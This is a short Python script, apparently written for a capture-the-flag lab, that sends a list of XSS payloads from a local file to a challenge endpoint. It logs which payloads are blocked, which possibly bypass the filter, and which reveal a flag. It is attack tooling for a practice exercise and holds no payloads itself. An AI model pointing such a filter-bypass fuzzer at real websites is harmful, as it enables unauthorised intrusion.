import requests
import urllib.parse
import re
import time

URL = "https://xss2.dsa.linti.unlp.edu.ar/mutation?payload="
HEADERS = {
    "User-Agent": "Mozilla/5.0"
}

log_file = open("xss_log.txt", "w", encoding="utf-8")

with open("xss_payloads.txt", "r") as file:
    payloads = [line.strip() for line in file if line.strip()]

def log_result(message):
    print(message)
    log_file.write(message + "\n")

def check_response(content, payload):
    if "flag{" in content.lower() or "FLAG{" in content:
        log_result(f"[✅ FLAG FOUND] Payload: {payload}")
        return True
    elif "I don't like that attack vector" not in content:
        log_result(f"[⚠️ POSSIBLE BYPASS] Payload: {payload}")
    else:
        log_result(f"[❌ Blocked] Payload: {payload}")
    return False

found_flag = False
for i, payload in enumerate(payloads):
    full_url = URL + payload
    try:
        response = requests.get(full_url, headers=HEADERS, timeout=10)
        found_flag = check_response(response.text, payload) or found_flag
        time.sleep(0.5)  # evita sobrecargar el servidor
    except Exception as e:
        log_result(f"[ERROR] Payload {payload} --> {e}")

log_file.close()
if not found_flag:
    print("🔍 No se encontró ninguna flag. Revisá xss_log.txt para más detalles.")
else:
    print("🎉 ¡Se encontró al menos una flag!")

